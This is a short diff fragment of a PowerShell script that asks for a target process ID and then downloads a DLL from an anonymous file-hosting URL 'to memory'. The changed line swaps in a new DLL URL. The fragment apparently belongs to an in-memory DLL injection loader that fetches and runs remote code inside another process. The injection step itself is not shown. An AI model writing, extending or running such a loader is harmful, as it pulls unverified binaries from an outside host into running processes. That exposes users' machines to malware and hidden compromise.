@@ -12,7 +12,7 @@ Invoke-Command -ScriptBlock {
     }
     $targetPid = [int]$pidInput
     
-    $dllUrl = "https://files.catbox.moe/621w8f.dll"
+    $dllUrl = "https://files.catbox.moe/b0ftb1.dll"
     Write-Host "[*] Downloading DLL to Memory..." -ForegroundColor Yellow
     
     try {
